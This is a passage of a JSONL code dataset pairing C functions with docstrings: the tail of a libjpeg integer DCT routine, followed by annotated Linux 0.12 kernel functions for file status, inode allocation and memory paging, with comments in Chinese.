(DCTELEM) ((tmp10 - tmp11) << PASS1_BITS);\n    \n    z1 = MULTIPLY(tmp12 + tmp13, FIX_0_541196100);\n    dataptr[2] = (DCTELEM) DESCALE(z1 + MULTIPLY(tmp13, FIX_0_765366865),\n\t\t\t\t   CONST_BITS-PASS1_BITS);\n    dataptr[6] = (DCTELEM) DESCALE(z1 + MULTIPLY(tmp12, - FIX_1_847759065),\n\t\t\t\t   CONST_BITS-PASS1_BITS);\n    \n    /* Odd part per figure 8 --- note paper omits factor of sqrt(2).\n     * cK represents cos(K*pi/16).\n     * i0..i3 in the paper are tmp4..tmp7 here.\n     */\n    \n    z1 = tmp4 + tmp7;\n    z2 = tmp5 + tmp6;\n    z3 = tmp4 + tmp6;\n    z4 = tmp5 + tmp7;\n    z5 = MULTIPLY(z3 + z4, FIX_1_175875602); /* sqrt(2) * c3 */\n    \n    tmp4 = MULTIPLY(tmp4, FIX_0_298631336); /* sqrt(2) * (-c1+c3+c5-c7) */\n    tmp5 = MULTIPLY(tmp5, FIX_2_053119869); /* sqrt(2) * ( c1+c3-c5+c7) */\n    tmp6 = MULTIPLY(tmp6, FIX_3_072711026); /* sqrt(2) * ( c1+c3+c5-c7) */\n    tmp7 = MULTIPLY(tmp7, FIX_1_501321110); /* sqrt(2) * ( c1+c3-c5-c7) */\n    z1 = MULTIPLY(z1, - FIX_0_899976223); /* sqrt(2) * (c7-c3) */\n    z2 = MULTIPLY(z2, - FIX_2_562915447); /* sqrt(2) * (-c1-c3) */\n    z3 = MULTIPLY(z3, - FIX_1_961570560); /* sqrt(2) * (-c3-c5) */\n    z4 = MULTIPLY(z4, - FIX_0_390180644); /* sqrt(2) * (c5-c3) */\n    \n    z3 += z5;\n    z4 += z5;\n    \n    dataptr[7] = (DCTELEM) DESCALE(tmp4 + z1 + z3, CONST_BITS-PASS1_BITS);\n    dataptr[5] = (DCTELEM) DESCALE(tmp5 + z2 + z4, CONST_BITS-PASS1_BITS);\n    dataptr[3] = (DCTELEM) DESCALE(tmp6 + z2 + z3, CONST_BITS-PASS1_BITS);\n    dataptr[1] = (DCTELEM) DESCALE(tmp7 + z1 + z4, CONST_BITS-PASS1_BITS);\n    \n    dataptr += DCTSIZE;\t\t/* advance pointer to next row */\n  }\n\n  /* Pass 2: process columns.\n   * We remove the PASS1_BITS scaling, but leave the results scaled up\n   * by an overall factor of 8.\n   */\n\n  dataptr = data;\n  for (ctr = DCTSIZE-1; ctr >= 0; ctr--) {\n    tmp0 = dataptr[DCTSIZE*0] + dataptr[DCTSIZE*7];\n    tmp7 = dataptr[DCTSIZE*0] - dataptr[DCTSIZE*7];\n    tmp1 = dataptr[DCTSIZE*1] + dataptr[DCTSIZE*6];\n    tmp6 = dataptr[DCTSIZE*1] - dataptr[DCTSIZE*6];\n    tmp2 = dataptr[DCTSIZE*2] + dataptr[DCTSIZE*5];\n    tmp5 = dataptr[DCTSIZE*2] - dataptr[DCTSIZE*5];\n    tmp3 = dataptr[DCTSIZE*3] + dataptr[DCTSIZE*4];\n    tmp4 = dataptr[DCTSIZE*3] - dataptr[DCTSIZE*4];\n    \n    /* Even part per LL&M figure 1 --- note that published figure is faulty;\n     * rotator \"sqrt(2)*c1\" should be \"sqrt(2)*c6\".\n     */\n    \n    tmp10 = tmp0 + tmp3;\n    tmp13 = tmp0 - tmp3;\n    tmp11 = tmp1 + tmp2;\n    tmp12 = tmp1 - tmp2;\n    \n    dataptr[DCTSIZE*0] = (DCTELEM) DESCALE(tmp10 + tmp11, PASS1_BITS);\n    dataptr[DCTSIZE*4] = (DCTELEM) DESCALE(tmp10 - tmp11, PASS1_BITS);\n    \n    z1 = MULTIPLY(tmp12 + tmp13, FIX_0_541196100);\n    dataptr[DCTSIZE*2] = (DCTELEM) DESCALE(z1 + MULTIPLY(tmp13, FIX_0_765366865),\n\t\t\t\t\t   CONST_BITS+PASS1_BITS);\n    dataptr[DCTSIZE*6] = (DCTELEM) DESCALE(z1 + MULTIPLY(tmp12, - FIX_1_847759065),\n\t\t\t\t\t   CONST_BITS+PASS1_BITS);\n    \n    /* Odd part per figure 8 --- note paper omits factor of sqrt(2).\n     * cK represents cos(K*pi/16).\n     * i0..i3 in the paper are tmp4..tmp7 here.\n     */\n    \n    z1 = tmp4 + tmp7;\n    z2 = tmp5 + tmp6;\n    z3 = tmp4 + tmp6;\n    z4 = tmp5 + tmp7;\n    z5 = MULTIPLY(z3 + z4, FIX_1_175875602); /* sqrt(2) * c3 */\n    \n    tmp4 = MULTIPLY(tmp4, FIX_0_298631336); /* sqrt(2) * (-c1+c3+c5-c7) */\n    tmp5 = MULTIPLY(tmp5, FIX_2_053119869); /* sqrt(2) * ( c1+c3-c5+c7) */\n    tmp6 = MULTIPLY(tmp6, FIX_3_072711026); /* sqrt(2) * ( c1+c3+c5-c7) */\n    tmp7 = MULTIPLY(tmp7, FIX_1_501321110); /* sqrt(2) * ( c1+c3-c5-c7) */\n    z1 = MULTIPLY(z1, - FIX_0_899976223); /* sqrt(2) * (c7-c3) */\n    z2 = MULTIPLY(z2, - FIX_2_562915447); /* sqrt(2) * (-c1-c3) */\n    z3 = MULTIPLY(z3, - FIX_1_961570560); /* sqrt(2) * (-c3-c5) */\n    z4 = MULTIPLY(z4, - FIX_0_390180644); /* sqrt(2) * (c5-c3) */\n    \n    z3 += z5;\n    z4 += z5;\n    \n    dataptr[DCTSIZE*7] = (DCTELEM) DESCALE(tmp4 + z1 + z3,\n\t\t\t\t\t   CONST_BITS+PASS1_BITS);\n    dataptr[DCTSIZE*5] = (DCTELEM) DESCALE(tmp5 + z2 + z4,\n\t\t\t\t\t   CONST_BITS+PASS1_BITS);\n    dataptr[DCTSIZE*3] = (DCTELEM) DESCALE(tmp6 + z2 + z3,\n\t\t\t\t\t   CONST_BITS+PASS1_BITS);\n    dataptr[DCTSIZE*1] = (DCTELEM) DESCALE(tmp7 + z1 + z4,\n\t\t\t\t\t   CONST_BITS+PASS1_BITS);\n    \n    dataptr++;\t\t\t/* advance pointer to next column */\n  }\n}", "path": "Source\\External\\LibJPEG\\jfdctint.c", "repo_name": "PrimeSense/Sensor", "stars": 381, "license": "apache-2.0", "language": "c", "size": 4962}
{"docstring": "/**\n * \u83b7\u53d6\u6587\u4ef6\u72b6\u6001 \u7cfb\u7edf\u8c03\u7528\n * \u6839\u636e\u7ed9\u5b9a\u7684\u6587\u4ef6\u540d\u83b7\u53d6\u76f8\u5173\u6587\u4ef6\u72b6\u6001\u4fe1\u606f\u3002\u6587\u4ef6\u8def\u5f84\u540d\u4e2d\u6709\u7b26\u53f7\u94fe\u63a5\u6587\u4ef6\u540d\uff0c\u5219\u53d6\u7b26\u53f7\u6587\u4ef6\u7684\u72b6\u6001\u3002\n * @param[in]\t\tfilename\t\u6307\u5b9a\u7684\u6587\u4ef6\u540d\n * @param[in/out]\tstatbuf\t\t\u5b58\u653e\u72b6\u6001\u4fe1\u606f\u7684\u7f13\u51b2\u533a\u6307\u9488\n * @retval\t\t\t\u6210\u529f\u8fd4\u56de0\uff0c\u51fa\u9519\u8fd4\u56de\u51fa\u9519\u7801\n */\n", "func_signal": "int sys_lstat(char * filename, struct stat * statbuf)", "code": "{\n\tstruct m_inode * inode;\n\n\tif (!(inode = lnamei(filename))) {\n\t\treturn -ENOENT;\n\t}\n\tcp_stat(inode,statbuf);\n\tiput(inode);\n\treturn 0;\n}", "path": "linux-0.12\\fs\\stat.c", "repo_name": "ultraji/linux-0.12", "stars": 390, "license": "gpl-3.0", "language": "c", "size": 5567}
{"docstring": "/**\n * \u7b26\u53f7\u94fe\u63a5\u6587\u4ef6 \u7cfb\u7edf\u8c03\u7528\n * \u8be5\u8c03\u7528\u8bfb\u53d6\u7b26\u53f7\u94fe\u63a5\u6587\u4ef6\u7684\u5185\u5bb9\uff08\u5373\u8be5\u7b26\u53f7\u94fe\u63a5\u6240\u6307\u5411\u6587\u4ef6\u7684\u8def\u5f84\u540d\u5b57\u7b26\u4e32\uff09\uff0c\u5e76\u653e\u5230\u6307\u5b9a\u957f\u5ea6\u7684\u7528\u6237\u7f13\n * \u51b2\u533a\u4e2d\u3002\u82e5\u7f13\u51b2\u533a\u592a\u5c0f\uff0c\u5c31\u4f1a\u622a\u65ad\u7b26\u53f7\u94fe\u63a5\u7684\u5185\u5bb9\u3002\n * @param[in]\t\tpath\t\u7b26\u53f7\u94fe\u63a5\u6587\u4ef6\u8def\u5f84\u540d\n * @param[in/out]\tbuf\t\t\u7528\u6237\u7f13\u51b2\u533a\n * @param[in]\t\tbufsiz\t\u7f13\u51b2\u533a\u957f\u5ea6\n * @retval\t\t\t\u6210\u529f\u5219\u8fd4\u56de\u653e\u5165\u7f13\u51b2\u533a\u4e2d\u7684\u5b57\u7b26\u6570\uff1b\u82e5\u5931\u8d25\u5219\u8fd4\u56de\u51fa\u9519\u7801\n*/\n", "func_signal": "int sys_readlink(const char * path, char * buf, int bufsiz)", "code": "{\n\tstruct m_inode * inode;\n\tstruct buffer_head * bh;\n\tint i;\n\tchar c;\n\n\tif (bufsiz <= 0) {\n\t\treturn -EBADF;\n\t}\n\tif (bufsiz > 1023) {\n\t\tbufsiz = 1023;\n\t}\n\tverify_area(buf, bufsiz);\n\tif (!(inode = lnamei(path))) {\n\t\treturn -ENOENT;\n\t}\n\tif (inode->i_zone[0]) {\n\t\tbh = bread(inode->i_dev, inode->i_zone[0]);\n\t} else {\n\t\tbh = NULL;\n\t}\n\tiput(inode);\n\tif (!bh) {\n\t\treturn 0;\n\t}\n\ti = 0;\n\twhile (i < bufsiz && (c = bh->b_data[i])) {\n\t\ti++;\n\t\tput_fs_byte(c,buf++);\n\t}\n\tbrelse(bh);\n\treturn i;\n}", "path": "linux-0.12\\fs\\stat.c", "repo_name": "ultraji/linux-0.12", "stars": 390, "license": "gpl-3.0", "language": "c", "size": 5567}
{"docstring": "/**\n * \u5728\u8bbe\u5907dev\u4e0a\u521b\u5efa\u4e00\u4e2a\u65b0i\u8282\u70b9\n * @param[in]\tdev\t\t\u8bbe\u5907\u53f7\n * @retval\t\t\u6210\u529f\u8fd4\u56de\u65b0i\u8282\u70b9\u7684\u6307\u9488\uff0c\u5931\u8d25\u8fd4\u56deNULL\n */\n", "func_signal": "struct m_inode * new_inode(int dev)", "code": "{\n\tstruct m_inode * inode;\n\tstruct super_block * sb;\n\tstruct buffer_head * bh;\n\tint i, j;\n\n\t/* \u9996\u5148\u4ece\u5185\u5b58i\u8282\u70b9\u8868(inode_table)\u4e2d\u83b7\u53d6\u4e00\u4e2a\u7a7a\u95f2i\u8282\u70b9\u9879\uff0c\u5e76\u8bfb\u53d6\u6307\u5b9a\u8bbe\u5907\u7684\u8d85\u7ea7\u5757\u7ed3\u6784\u3002*/ \n\tif (!(inode = get_empty_inode())) {\n\t\treturn NULL;\n\t}\n\tif (!(sb = get_super(dev))) {\n\t\tpanic(\"new_inode with unknown device\");\n\t}\n\t/*\u626b\u63cf\u8d85\u7ea7\u5757\u4e2d8\u5757i\u8282\u70b9\u4f4d\u56fe\uff0c\u5bfb\u627e\u7b2c1\u4e2a0\u4f4d(\u7a7a\u95f2\u8282\u70b9)\uff0c\u83b7\u53d6\u5e76\u8bbe\u7f6e\u8be5i\u8282\u70b9\u7684\u8282\u70b9\u53f7\u3002*/\n\tj = 8192;\n\tfor (i = 0 ; i < 8 ; i++) {\n\t\tif ((bh = sb->s_imap[i])) {\n\t\t\tif ((j = find_first_zero(bh->b_data)) < 8192) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\t/* \u5982\u679c\u5168\u90e8\u626b\u63cf\u5b8c\u8fd8\u6ca1\u627e\u5230\u7a7a\u95f2i\u8282\u70b9\u6216\u8005\u4f4d\u56fe\u6240\u5728\u7684\u7f13\u51b2\u5757\u65e0\u6548(bh = NULL)\uff0c\u5219\u653e\u56de\u5148\u524d\u7533\u8bf7\u7684i\u8282\n\t \u70b9\u8868\u4e2d\u7684i\u8282\u70b9\uff0c\u5e76\u8fd4\u56de\u7a7a\u6307\u9488\u9000\u51fa */\n\tif (!bh || j >= 8192 || j + i * 8192 > sb->s_ninodes) {\n\t\tiput(inode);\n\t\treturn NULL;\n\t}\n\t/* \u73b0\u5728\u5df2\u7ecf\u627e\u5230\u4e86\u8fd8\u672a\u4f7f\u7528\u7684i\u8282\u70b9\u53f7j\u3002\u4e8e\u662f\u7f6e\u4f4di\u8282\u70b9j\u5bf9\u5e94\u7684i\u8282\u70b9\u4f4d\u56fe\u76f8\u5e94\u6bd4\u7279\u4f4d\u3002\u7136\u540e\u7f6ei\u8282\u70b9\u4f4d\n\t \u56fe\u6240\u5728\u7f13\u51b2\u5757\u5df2\u4fee\u6539\u6807\u5fd7 */\n\tif (set_bit(j, bh->b_data)) {\n\t\tpanic(\"new_inode: bit already set\");\n\t}\n\tbh->b_dirt = 1;\n\t/* \u521d\u59cb\u5316\u8be5i\u8282\u70b9\u7ed3\u6784 */\n\tinode->i_count = 1;\n\tinode->i_nlinks = 1;\n\tinode->i_dev = dev;\n\tinode->i_uid = current->euid;\n\tinode->i_gid = current->egid;\n\tinode->i_dirt = 1;\n\tinode->i_num = j + i * 8192;\n\tinode->i_mtime = inode->i_atime = inode->i_ctime = CURRENT_TIME;\n\treturn inode;\n}", "path": "linux-0.12\\fs\\bitmap.c", "repo_name": "ultraji/linux-0.12", "stars": 390, "license": "gpl-3.0", "language": "c", "size": 5567}
{"docstring": "/**\n * \u7269\u7406\u5185\u5b58\u7ba1\u7406\u521d\u59cb\u5316\n * \u8be5\u51fd\u6570\u5bf91MB\u4ee5\u4e0a\u5185\u5b58\u533a\u57df\u4ee5\u9875\u9762\u4e3a\u5355\u4f4d\u8fdb\u884c\u7ba1\u7406\u524d\u7684\u521d\u59cb\u5316\u8bbe\u7f6e\u5de5\u4f5c\uff0c\u4e00\u4e2a\u9875\u9762\u957f\u5ea6\u4e3a4KB\uff0c\u5e76\u4f7f\u7528\u4e00\u4e2a\u9875\n * \u9762\u6620\u5c04\u5b57\u8282\u6570\u7ec4mem_map[]\u6765\u7ba1\u7406\u6240\u6709\u8fd9\u4e9b\u9875\u9762\u3002\n * @param[in]\tstart_mem\t\u4e3b\u5185\u5b58\u533a\u7684\u5f00\u59cb\u5730\u5740\n * @param[in]\tend_mem\t\t\u4e3b\u5185\u5b58\u533a\u7684\u7ed3\u675f\u5730\u5740\n * @return\t\tvoid\n */\n", "func_signal": "void mem_init(long start_mem, long end_mem)", "code": "{\n\tint i;\n\n\t/* \u9996\u5148\uff0c\u5c061MB\u523016MB\u8303\u56f4\u5185\u7684\u5185\u5b58\u9875\u9762\u5bf9\u5e94\u7684\u6570\u7ec4\u9879\u7f6e\u4e3aUSED(100)\uff0c\u5373\u5df2\u5360\u7528\u72b6\u6001 */\n\tHIGH_MEMORY = end_mem;\t\t\t/* \u8bbe\u7f6e\u5185\u5b58\u6700\u9ad8\u7aef */\n\tfor (i = 0; i < PAGING_PAGES; i++) {\n\t\tmem_map[i] = USED;\n\t}\n\n\t/* \u627e\u5230\u4e3b\u5185\u5b58\u533a\u8d77\u59cb\u4f4d\u7f6e\u5904\u9875\u9762\u53f7i */\n\ti = MAP_NR(start_mem);\n\n\t/* \u5f97\u5230\u4e3b\u5185\u5b58\u533a\u7684\u9875\u9762\u7684\u6570\u91cf */\t\t\t\t\t\t\t\t\n\tend_mem -= start_mem;\n\tend_mem >>= 12;\n\n\t/* \u5c06\u4e3b\u5185\u5b58\u533a\u5bf9\u5e94\u7684\u9875\u9762\u7684\u4f7f\u7528\u6570\u7f6e0\uff0c\u5373\u672a\u4f7f\u7528 */\n\twhile (end_mem-- > 0) {\n\t\tmem_map[i++] = 0;\n\t}\n}", "path": "linux-0.12\\mm\\memory.c", "repo_name": "ultraji/linux-0.12", "stars": 390, "license": "gpl-3.0", "language": "c", "size": 5567}
{"docstring": "/**\n * \u5199\u9875\u9762\u9a8c\u8bc1\n * \u82e5\u9875\u9762\u4e0d\u53ef\u5199\uff0c\u5219\u590d\u5236\u9875\u9762\u3002\u5728fork.c\u4e2d\u88ab\u5185\u5b58\u9a8c\u8bc1\u901a\u7528\u51fd\u6570verify_area()\u8c03\u7528\n * @param[in]\taddress\t\t\u6307\u5b9a\u9875\u9762\u57284GB\u7a7a\u95f4\u4e2d\u7684\u7ebf\u6027\u5730\u5740\n * @return\t\tvoid\n */\n", "func_signal": "void write_verify(unsigned long address)", "code": "{\n\tunsigned long page;\n\n\t/* \u6307\u5b9a\u7ebf\u6027\u5730\u5740\u5bf9\u5e94\u7684\u9875\u76ee\u5f55\u9879\u662f\u5426\u5b58\u5728 */\n\tif (!( (page = *((unsigned long *) ((address >> 20) & 0xffc)) ) & 1)) {\n\t\treturn;\n\t}\n\tpage &= 0xfffff000;\n\t/* \u5f97\u5230\u9875\u8868\u9879\u7684\u7269\u7406\u5730\u5740 */\n\tpage += ((address >> 10) & 0xffc);\n\t/* \u7136\u540e\u5224\u65ad\u8be5\u9875\u8868\u9879\u4e2d\u4f4d1(R/W)\uff0c\u4f4d0(P)\u6807\u5fd7 */\n\tif ((3 & *(unsigned long *) page) == 1) {  /* non-writeable, present */\n\t\tun_wp_page((unsigned long *) page);\n\t}\n\treturn;\n}", "path": "linux-0.12\\mm\\memory.c", "repo_name": "ultraji/linux-0.12", "stars": 390, "license": "gpl-3.0", "language": "c", "size": 5567}
{"docstring": "/**\n * \u6839\u636e\u6307\u5b9a\u7684\u7ebf\u6027\u5730\u5740\u548c\u9650\u957f(\u9875\u8868\u4e2a\u6570)\uff0c\u91ca\u653e\u6307\u5b9a\u9875\u9762\n * @param[in]\tfrom\t\t\u8d77\u59cb\u7ebf\u6027\u57fa\u5730\u5740\n * @param[in] \tsize\t\t\u91ca\u653e\u7684\u5b57\u8282\u957f\u5ea6\n * @return\t\t0\n */\n", "func_signal": "int free_page_tables(unsigned long from, unsigned long size)", "code": "{\n\tunsigned long *pg_table;\n\tunsigned long * dir, nr;\n\n\tif (from & 0x3fffff) {\t/* \u53c2\u6570from\u7ed9\u51fa\u7684\u7ebf\u6027\u57fa\u5730\u5740\u662f\u5426\u57284MB\u7684\u8fb9\u754c\u5904 */\n\t\tpanic(\"free_page_tables called with wrong alignment\");\n\t}\n\tif (!from) {\t\t\t/* from=0\u8bf4\u660e\u8bd5\u56fe\u91ca\u653e\u5185\u6838\u548c\u7f13\u51b2\u6240\u5728\u7684\u7269\u7406\u5185\u5b58\u7a7a\u95f4 */\n\t\tpanic(\"Trying to free up swapper memory space\");\n\t}\n\t/* \u8ba1\u7b97size\u6307\u5b9a\u957f\u5ea6\u6240\u5360\u7684\u9875\u76ee\u5f55\u6570\uff084MB\u7684\u8fdb\u4f4d\u6574\u6570\u500d\uff0c\u5411\u4e0a\u53d6\u6574\uff09\uff0c\u4f8b\u5982size=4.01MB\u5219size=2 */\n\tsize = (size + 0x3fffff) >> 22;\n\t/* \u9875\u76ee\u5f55\u9879\u6307\u9488 */\n\tdir = (unsigned long *) ((from >> 20) & 0xffc); \t\t\t/* _pg_dir = 0 */\n\t/* \u904d\u5386\u9700\u8981\u91ca\u653e\u7684\u9875\u76ee\u5f55\u9879\uff0c\u91ca\u653e\u5bf9\u5e94\u9875\u8868\u4e2d\u7684\u9875\u8868\u9879 */\n\tfor ( ; size-- > 0 ; dir++) {\n\t\tif (!(1 & *dir)) {\n\t\t\tcontinue;\n\t\t}\n\t\tpg_table = (unsigned long *) (0xfffff000 & *dir);\n\t\tfor (nr = 0 ; nr < 1024 ; nr++) {\n\t\t\tif (*pg_table) {\n\t\t\t\tif (1 & *pg_table) {\t/* \u5728\u7269\u7406\u5185\u5b58\u4e2d  */\n\t\t\t\t\tfree_page(0xfffff000 & *pg_table);\n\t\t\t\t} else {\t\t\t\t/* \u5728\u4ea4\u6362\u8bbe\u5907\u4e2d */\n\t\t\t\t\tswap_free(*pg_table >> 1);\n\t\t\t\t}\n\t\t\t\t*pg_table = 0;\n\t\t\t}\n\t\t\tpg_table++;\n\t\t}\n\t\tfree_page(0xfffff000 & *dir);\n\t\t*dir = 0;\n\t}\n\tinvalidate();\n\treturn 0;\n}", "path": "linux-0.12\\mm\\memory.c", "repo_name": "ultraji/linux-0.12", "stars": 390, "license": "gpl-3.0", "language": "c", "size": 5567}
{"docstring": "/**\n * \u83b7\u53d6\u6587\u4ef6\u72b6\u6001\n * \u6839\u636e\u7ed9\u5b9a\u7684\u6587\u4ef6\u540d\u83b7\u53d6\u76f8\u5173\u6587\u4ef6\u72b6\u6001\u4fe1\u606f\u3002\n * @param[in]\t\tfd\t\t\t\u6307\u5b9a\u6587\u4ef6\u7684\u53e5\u67c4\n * @param[in/out]\tstatbuf\t\t\u5b58\u653e\u72b6\u6001\u4fe1\u606f\u7684\u7f13\u51b2\u533a\u6307\u9488\n * @retval\t\t\t\u6210\u529f\u8fd4\u56de0\uff0c\u51fa\u9519\u8fd4\u56de\u51fa\u9519\u7801\n */\n", "func_signal": "int sys_fstat(unsigned int fd, struct stat * statbuf)", "code": "{\n\tstruct file * f;\n\tstruct m_inode * inode;\n\n\tif (fd >= NR_OPEN || !(f = current->filp[fd]) || !(inode = f->f_inode)) {\n\t\treturn -EBADF;\n\t}\n\tcp_stat(inode,statbuf);\n\treturn 0;\n}", "path": "linux-0.12\\fs\\stat.c", "repo_name": "ultraji/linux-0.12", "stars": 390, "license": "gpl-3.0", "language": "c", "size": 5567}
{"docstring": "/**\n * \u6267\u884c\u7f3a\u9875\u5904\u7406\uff08\u5728page.s\u4e2d\u88ab\u8c03\u7528\uff09\n * \u51fd\u6570\u53c2\u6570error_code\u548caddress\u662f\u8fdb\u7a0b\u5728\u8bbf\u95ee\u9875\u9762\u65f6\u7531CPU\u56e0\u7f3a\u9875\u4ea7\u751f\u5f02\u5e38\u800c\u81ea\u52a8\u751f\u6210\u3002\n * 1. \u9996\u5148\u67e5\u770b\u6240\u7f3a\u9875\u662f\u5426\u5728\u4ea4\u6362\u8bbe\u5907\u4e2d\uff0c\u82e5\u662f\u5219\u4ea4\u6362\u8fdb\u6765\u3002\n * 2. \u5426\u5219\u5c1d\u8bd5\u4e0e\u5df2\u52a0\u8f7d\u7684\u76f8\u540c\u6587\u4ef6\u8fdb\u884c\u9875\u9762\u5171\u4eab\uff0c\u6216\u8005\u53ea\u662f\u7531\u4e8e\u8fdb\u7a0b\u52a8\u6001\u7533\u8bf7\u5185\u5b58\u9875\u9762\u800c\u53ea\u9700\n *    \u6620\u5c04\u4e00\u9875\u7269\u7406\u5185\u5b58\u9875\u5373\u53ef\u3002\n * 3. \u82e5\u5171\u4eab\u64cd\u4f5c\u4e0d\u6210\u529f\uff0c\u90a3\u4e48\u53ea\u80fd\u4ece\u76f8\u5e94\u6587\u4ef6\u4e2d\u8bfb\u5165\u6240\u7f3a\u7684\u6570\u636e\u9875\u9762\u5230\u6307\u5b9a\u7ebf\u6027\u5730\u5740\u5904\u3002\n * @param[in]\terror_code\t\u51fa\u9519\u7c7b\u578b\uff08\u6ca1\u7528\u5230\uff09\n * @param[in]\taddress\t\t\u4ea7\u751f\u5f02\u5e38\u7684\u9875\u9762\u7ebf\u6027\u5730\u5740(CR2\u5bc4\u5b58\u5668\u7684\u503c)\n * @return\t\tvoid\n */\n", "func_signal": "void do_no_page(unsigned long error_code, unsigned long address)", "code": "{\n\tint nr[4];\n\tunsigned long tmp;\n\tunsigned long page;\n\tint block, i;\n\tstruct m_inode * inode;\n\n\tif (address < TASK_SIZE)\n\t\tprintk(\"\\n\\rBAD!! KERNEL PAGE MISSING\\n\\r\");\n\n\tif (address - current->start_code > TASK_SIZE) {\n\t\tprintk(\"Bad things happen: nonexistent page error in do_no_page\\n\\r\");\n\t\tdo_exit(SIGSEGV);\n\t}\n\t/* 1.\u6240\u7f3a\u9875\u5728\u4ea4\u6362\u8bbe\u5907\u4e2d\uff0c\u4ece\u4ea4\u6362\u8bbe\u5907\u8bfb\u9875\u9762 */\n\tpage = *(unsigned long *) ((address >> 20) & 0xffc);\t/* \u53d6\u76ee\u5f55\u9879\u5185\u5bb9 */\n\tif (page & 1) { /* \u5b58\u5728\u4f4dP */\n\t\tpage &= 0xfffff000;\n\t\tpage += (address >> 10) & 0xffc;\n\t\ttmp = *(unsigned long *) page;\t\t\t\t\t\t/* \u53d6\u9875\u8868\u9879\u5185\u5bb9 */\n\t\tif (tmp && !(1 & tmp)) {\n\t\t\tswap_in((unsigned long *) page);\n\t\t\treturn;\n\t\t}\n\t}\n\t/* \u7b97\u51faaddress\u5904\u7f3a\u9875\u7684\u9875\u9762\u5730\u5740\u5728\u8fdb\u7a0b\u7a7a\u95f4\u4e2d\u7684\u504f\u79fb\u957f\u5ea6\u503ctmp\uff0c\u6839\u636e\u504f\u79fb\u503c\u5224\u5b9a\u7f3a\u9875\u6240\u5728\u8fdb\u7a0b\u7a7a\n\t \u95f4\u4f4d\u7f6e\uff0c\u83b7\u53d6i\u8282\u70b9\u548c\u5757\u53f7\uff0c\u7528\u4e8e\u4e4b\u540e\u4ece\u6587\u4ef6\u4e2d\u52a0\u8f7d\u9875\u9762 */\n\taddress &= 0xfffff000;\n\ttmp = address - current->start_code;\n\tif (tmp >= LIBRARY_OFFSET ) { \t\t/* \u7f3a\u9875\u5728\u5e93\u6620\u50cf\u6587\u4ef6\u4e2d */\n\t\tinode = current->library;\n\t\tblock = 1 + (tmp - LIBRARY_OFFSET) / BLOCK_SIZE;\n\t} else if (tmp < current->end_data) { /* \u7f3a\u9875\u5728\u6267\u884c\u6620\u50cf\u6587\u4ef6\u4e2d */\n\t\tinode = current->executable;\n\t\tblock = 1 + tmp / BLOCK_SIZE;\n\t} else { /* \u7f3a\u9875\u5728\u52a8\u6001\u7533\u8bf7\u7684\u6570\u636e\u6216\u6808\u5185\u5b58\u9875\u9762\uff0c\u65e0i\u8282\u70b9\u548c\u5757\u53f7 */\n\t\tinode = NULL;\n\t\tblock = 0;\n\t}\n\n\t/* 2. \u7f3a\u9875\u4e3a\u52a8\u6001\u7533\u8bf7\u7684\u5185\u5b58\u9875\u9762\uff0c\u5219\u76f4\u63a5\u7533\u8bf7\u4e00\u9875\u7269\u7406\u5185\u5b58\u9875\u9762\u5e76\u6620\u5c04\u5230\u7ebf\u6027\u5730\u5740address\u5373\u53ef */\n\tif (!inode) {\n\t\tget_empty_page(address);\n\t\treturn;\n\t}\n\t\n\t/* 3. \u7f3a\u9875\u5728\u8fdb\u7a0b\u6267\u884c\u6587\u4ef6\u6216\u5e93\u6587\u4ef6\u8303\u56f4\u5185\uff0c\u5c1d\u8bd5\u5171\u4eab\u9875\u9762\u64cd\u4f5c */\n\tif (share_page(inode, tmp))\n\t\treturn;\n\t\n\t/* 4. \u5171\u4eab\u4e0d\u6210\u529f\u5c31\u53ea\u80fd\u7533\u8bf7\u4e00\u9875\u7269\u7406\u5185\u5b58\u9875\u9762page\uff0c\u7136\u540e\u8bfb\u53d6\u6267\u884c\u6587\u4ef6\u4e2d\u7684\u76f8\u5e94\u9875\u9762\u5e76\u6620\u5c04\u5230\u903b\u8f91\u5730\u5740tmp\u5904 */\n\tif (!(page = get_free_page()))\n\t\toom();\n\t/* remember that 1 block is used for header */\n\t/* \u8bb0\u4f4f\uff0c\u7a0b\u5e8f\u5934\u5360\u75281\u4e2a\u6570\u636e\u5757\uff08\u7528\u4e8e\u89e3\u91ca\u4e0a\u9762 block = 1+ ...\uff09 */\n\tfor (i = 0 ; i < 4 ; block++, i++)\n\t\tnr[i] = bmap(inode, block); /* \u83b7\u53d6\u8bbe\u5907\u903b\u8f91\u5757\u53f7 */\n\tbread_page(page, inode->i_dev, nr);\n\n\t/* \u8bfb\u53d6\u6267\u884c\u7a0b\u5e8f\u6700\u540e\u4e00\u9875\uff08\u5b9e\u9645\u4e0d\u6ee1\u4e00\u9875\uff09\uff0c\u628a\u8d85\u51faend_data\u540e\u7684\u90e8\u5206\u8fdb\u884c\u6e05\u96f6\u5904\u7406\uff0c\u82e5\u8be5\u9875\u9762\u79bb\u6267\u884c\u7a0b\u5e8f\u672b\u7aef\n\t \u8d85\u8fc71\u9875\uff0c\u8bf4\u660e\u662f\u4ece\u5e93\u6587\u4ef6\u4e2d\u8bfb\u53d6\u7684\uff0c\u56e0\u6b64\u4e0d\u7528\u6267\u884c\u6e05\u96f6\u64cd\u4f5c */\n\ti = tmp + 4096 - current->end_data;\n\tif (i > 4095)\n\t\ti = 0;\n\ttmp = page + 4096;\n\twhile (i-- > 0) {\n\t\ttmp--;\n\t\t*(char *)tmp = 0;\n\t}\n\t/* \u628a\u5f15\u8d77\u7f3a\u9875\u5f02\u5e38\u7684\u4e00\u9875\u7269\u7406\u9875\u9762\u6620\u5c04\u5230\u6307\u5b9a\u7ebf\u6027\u5730\u5740address\u5904 */\n\tif (put_page(page, address))\n\t\treturn;\n\t/* \u5426\u5219\u91ca\u653e\u7269\u7406\u9875\u9762\uff0c\u663e\u793a\u5185\u5b58\u4e0d\u591f */\n\tfree_page(page);\n\toom();\n}", "path": "linux-0.12\\mm\\memory.c", "repo_name": "ultraji/linux-0.12", "stars": 390, "license": "gpl-3.0", "language": "c", "size": 5567}
